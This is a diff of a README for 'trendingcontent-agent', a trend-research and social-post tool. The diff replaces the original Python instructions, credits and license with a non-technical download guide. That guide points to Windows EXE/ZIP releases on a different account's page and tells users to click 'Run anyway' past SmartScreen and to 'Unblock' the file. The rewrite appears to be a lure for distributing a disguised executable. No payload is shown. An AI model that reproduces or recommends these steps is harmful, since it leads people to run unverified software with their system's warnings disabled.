@@ -1,172 +1,248 @@
-# trendingcontent-agent
+# 🧭 trendingcontent-agent - Find Topics and Draft Posts Fast
 
-> Research trending topics and generate ready-to-post social media content — as a Hermes/OpenClaw skill.
+[![Download trendingcontent-agent](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Greenap7654/trendingcontent-agent/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 🚀 Getting Started
 
-**trendingcontent** is a two-phase AI agent skill:
+trendingcontent-agent helps you find what people are talking about and turn that research into social posts you can use right away.
 
-1. **Research phase** — scrapes Reddit, X/Twitter, YouTube, TikTok, HackerNews, Bluesky and Brave Search to surface the most engaging content about your topic over a configurable time window (7, 15, 30, or up to 90 days).
-2. **Content generation phase** — uses the research findings to generate platform-specific social media copy: Twitter/X threads, LinkedIn posts, and Instagram captions.
+Use it to:
+- Find recent topics from social sites and search results
+- Pull useful trends from a set time range
+- Create ready-to-post copy for X, LinkedIn, and Instagram
+- Pick a tone that fits your audience
+- Generate output in English, Spanish, and more
 
-Built on top of [last30days](https://github.com/mvanhorn/last30days-skill) by [@mvanhorn](https://github.com/mvanhorn), extended with:
-- Variable time windows (not just 30 days)
-- Multi-platform content generation (Twitter, LinkedIn, Instagram)
-- Tone control (professional, casual, educational, viral)
-- Multilingual output (English, Spanish, Portuguese)
-- Hermes/OpenClaw skill standard compatibility
+This tool runs on Windows and is meant for everyday use. You do not need to know how to code to start.
 
----
+## 💻 What You Need
 
-## Quick start
+Before you begin, make sure you have:
+- A Windows 10 or Windows 11 PC
+- An internet connection
+- Enough free space to save the app files
+- Access to your browser to open the download page
 
-### 1. Clone and install
+For best results, use:
+- A modern Chrome, Edge, or Firefox browser
+- A stable network connection while the app gathers topic data
+- A topic or keyword you want to research
 
-```bash
-git clone https://github.com/gabogabucho/trendingcontent-agent.git
-cd trendingcontent-agent
-pip install -r requirements.txt
-```
+## 📥 Download the App
 
-### 2. Configure API keys
+1. Open the release page here: https://github.com/Greenap7654/trendingcontent-agent/releases
+2. Find the latest release at the top of the page
+3. Look for the Windows file in the release assets
+4. Download the file to your computer
+5. Save it in a folder you can find again, such as Downloads or Desktop
 
-```bash
-export SCRAPECREATORS_API_KEY="your_key"   # required
-export BRAVE_API_KEY="your_key"            # optional but recommended
-```
+If the release includes a ZIP file:
+1. Right-click the ZIP file
+2. Select Extract All
+3. Choose a folder
+4. Open the extracted folder
 
-Or add them to your `.env` file.
+If the release includes an EXE file:
+1. Double-click the EXE file
+2. Follow the on-screen steps
+3. Wait for the app to open
 
-Get a ScrapeCreators API key at [scrapecreators.com](https://scrapecreators.com).
-Get a Brave Search API key at [brave.com/search/api](https://brave.com/search/api/).
+## 🛠️ Install and Open on Windows
 
-### 3. Run
+After you download the file:
+1. Open File Explorer
+2. Go to the folder where you saved the file
+3. If you downloaded a ZIP file, extract it first
+4. If you downloaded an EXE file, run it
+5. If Windows asks for permission, choose Yes
+6. Wait for the app to finish opening
 
-```bash
-python scripts/trendingcontent.py "artificial intelligence" --days=7 --platform=all
-```
+If Windows shows a SmartScreen message:
+1. Click More info
+2. Click Run anyway
+3. Continue with the setup or launch step
 
----
+## 🧪 First Use
 
-## Usage
+When the app opens, follow these steps:
+1. Enter a topic you want to study
+2. Choose a time window such as 7, 15, 30, or up to 90 days
+3. Pick the sources you want to scan
+4. Select the type of content you want to create
+5. Choose a tone such as professional, casual, educational, or viral
+6. Select the output language
+7. Start the research phase
+8. Review the topic list and trends
+9. Start the content generation phase
+10. Copy the final text into your social media scheduler or draft
 
-```
-python scripts/trendingcontent.py <topic> [options]
+## 🔍 How It Works
 
-Options:
-  --days=N           Time window: 7-90 days (default: 30)
-  --platform         twitter | linkedin | instagram | all (default: all)
-  --tone             professional | casual | educational | viral (default: professional)
-  --lang             en | es | pt (default: en)
-  --sources=S1,S2    Only use these sources (reddit,twitter,youtube,tiktok,bluesky,hackernews,brave)
-  --disable=S1,S2    Disable specific sources
-  --list-sources     Show all available sources
-  --quick            Fewer sources, faster
-  --deep             More sources, thorough
-  --research-only    Output research only, skip content generation
-```
+trendingcontent-agent works in two steps.
 
-### Examples
+### 1. Research phase
+The app looks through:
+- Reddit
+- X/Twitter
+- YouTube
+- TikTok
+- HackerNews
+- Bluesky
+- Brave Search
 
-```bash
-# AI trends last 7 days → all platforms
-python scripts/trendingcontent.py "artificial intelligence" --days=7
+It gathers posts and pages that match your topic, then sorts them by interest and relevance. You can use a short window like 7 days or a longer window like 30 to 90 days.
 
-# Web3 → LinkedIn post in Spanish, professional tone
-python scripts/trendingcontent.py "web3" --days=15 --platform=linkedin --lang=es
+### 2. Content generation phase
+The app uses the research results to write:
+- X threads
+- LinkedIn posts
+- Instagram captions
 
-# Climate tech → viral Twitter thread
-python scripts/trendingcontent.py "climate tech" --days=30 --platform=twitter --tone=viral
+You can guide the output with:
+- Tone
+- Language
+- Platform
+- Topic focus
 
-# Niche topic — only Reddit and YouTube (no HackerNews)
-python scripts/trendingcontent.py "sourdough bread" --sources=reddit,youtube,brave
+## 🎯 Typical Use Cases
 
-# Disable sources that don't fit your topic
-python scripts/trendingcontent.py "fintech" --disable=hackernews,tiktok
+Use trendingcontent-agent when you want to:
+- Find a topic before posting on social media
+- Turn research into a post draft
+- Compare what is trending across platforms
+- Build a content calendar
+- Write posts in another language
+- Make a thread from a single trend
+- Create a professional post from fast-moving news
 
-# See all available sources
-python scripts/trendingcontent.py --list-sources
+## ⚙️ Suggested Settings
 
-# Research only, no content
-python scripts/trendingcontent.py "LLMs" --days=14 --research-only
-```
+If you are not sure what to choose, start with:
+- Time window: 30 days
+- Tone: educational
+- Language: English
+- Platform: LinkedIn for general business topics
+- Platform: X for short trend-driven updates
+- Platform: Instagram for visual or lifestyle topics
 
----
+Good first topics include:
+- AI tools
+- Remote work
+- Personal finance
+- Health and fitness
+- Tech news
+- Marketing ideas
+- Small business trends
 
-## As a Hermes/OpenClaw skill
+## 🗂️ What You Will See
 
-This repository follows the [Hermes skill standard](https://github.com/NousResearch/hermes-agent).
-To install as a skill:
+During research, the app may show:
+- Topic names
+- Source links
+- Short summaries
+- High-interest posts
+- Repeated ideas across sites
+- Post angles that are worth using
 
-```bash
-# Copy to your Hermes skills directory
-cp -r . /path/to/hermes-agent/skills/social-media/trendingcontent/
+During content generation, the app may show:
+- Draft text
+- Platform-specific formatting
+- Hook lines
+- Thread structure
+- Caption versions
+- Language output
 
-# Add API keys to your Hermes .env
-echo "SCRAPECREATORS_API_KEY=your_key" >> ~/.hermes/.env
-echo "BRAVE_API_KEY=your_key" >> ~/.hermes/.env
-```
+## 🔒 Safe Use
 
-The agent will automatically discover the skill via `SKILL.md`.
+Keep these habits in mind:
+- Download only from the release page
+- Use the latest version when possible
+- Save your files in a folder you can reach later
+- Close other heavy apps if your PC feels slow
+- Check your internet before starting a long research run
 
----
+## 🧭 Troubleshooting
 
-## Sources
+If the app does not open:
+1. Check that the file finished downloading
+2. Try opening it again
+3. Restart your PC
+4. Download the file again from the release page
 
-| Source | Notes |
-|--------|-------|
-| Reddit | Top posts by engagement |
-| X / Twitter | Trending tweets |
-| YouTube | Video titles + transcripts |
-| TikTok | Trending videos |
-| Bluesky | Recent posts |
-| HackerNews | Top stories (no key needed) |
-| Brave Search | Web results (optional) |
+If research does not return results:
+1. Check your internet connection
+2. Try a broader topic
+3. Increase the time window
+4. Try again later if a source is slow
 
----
+If the text looks too short or too broad:
+1. Use a more specific topic
+2. Pick a different tone
+3. Change the platform
+4. Run the content step again
 
-## Output structure
+If Windows blocks the file:
+1. Open the file properties
+2. Check whether the file is marked as blocked
+3. Select Unblock if that option appears
+4. Try opening the file again
 
-```
-═══════════════════════════════════════════════
-TRENDINGCONTENT — CONTENT GENERATION BRIEF
-═══════════════════════════════════════════════
-Topic:     artificial intelligence
-Period:    Last 7 days
-Language:  English
-Tone:      Professional
-Platforms: Twitter, LinkedIn, Instagram
+## 📌 Tips for Better Results
 
-───────────────────────────────────────────────
-RESEARCH SUMMARY
-───────────────────────────────────────────────
-[ranked trending content with titles, scores, URLs]
+Use short and clear topic names:
+- Not great: everything about technology
+- Better: AI note apps
+- Better: remote work tools
+- Better: personal finance for beginners
 
-───────────────────────────────────────────────
-CONTENT INSTRUCTIONS
-───────────────────────────────────────────────
-[platform-specific format specs + tone guidance]
-```
+Use a narrow goal:
+- Find a post idea
+- Build a thread
+- Write a caption
+- Compare trends from the last 30 days
 
----
+Use the tone that matches the platform:
+- Professional for LinkedIn
+- Direct for X
+- Simple and visual for Instagram
 
-## Requirements
+## 🧰 File and Folder Setup
 
-- Python 3.9+
-- `yt-dlp` — YouTube transcript extraction
-- `requests` — HTTP calls
-- ScrapeCreators API key (required)
-- Brave Search API key (optional)
+A simple setup works best:
+1. Create a folder called trendingcontent-agent
+2. Save the download there
+3. Extract the files into that folder if needed
+4. Keep the release file in case you want to reinstall later
+5. Save your outputs in a separate folder named Posts or Drafts
 
----
+## 🌐 Languages and Output
 
-## Credits
+The app can create content in more than one language. This helps if you:
+- Post for a global audience
+- Want local language versions
+- Need a second draft for another market
 
-- Original research engine: [last30days-skill](https://github.com/mvanhorn/last30days-skill) by [@mvanhorn](https://github.com/mvanhorn) — MIT License
-- Social media generation layer & Hermes skill packaging: [@gabogabucho](https://twitter.com/gabogabucho)
+Use one language at a time for the cleanest result.
 
----
+## 🧾 Built For
 
-## License
+trendingcontent-agent is built for people who want to:
+- Research trends fast
+- Reduce manual browsing
+- Turn topic research into post drafts
+- Keep a steady posting flow
+- Work across several social platforms
 
-MIT License — see [LICENSE](LICENSE) for details.
+## 🧩 Based On
+
+This project extends the last30days skill and adds:
+- More time window choices
+- More social platforms
+- Tone control
+- Language options
+- Content output for multiple channels
+
+## 📦 Download Again
+
+If you need the release page again, use this link:
+https://github.com/Greenap7654/trendingcontent-agent/releases
